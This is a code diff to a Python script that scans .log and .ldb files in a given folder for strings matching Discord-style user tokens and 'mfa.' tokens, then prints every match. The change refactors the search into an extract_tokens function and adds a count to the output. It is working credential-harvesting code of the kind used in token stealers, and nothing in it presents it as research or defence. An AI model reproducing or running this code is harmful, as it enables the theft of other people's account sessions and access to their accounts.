@@ -23,16 +23,17 @@ def findTokens():
 
     return tokenList
 
-    def find_tokens(self, path):
-        tokens = []
-        for file_name in os.listdir(path):
-            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                continue
-            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
-        return tokens
+
+def extract_tokens(path):
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+        for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
 
 
 if __name__ == "__main__":
@@ -40,5 +41,6 @@ if __name__ == "__main__":
     if len(tokens) == 0:
         print("No tokens found")
     else:
+        print(f"Found {len(tokens)} tokens:")
         for token in tokens:
             print(token)
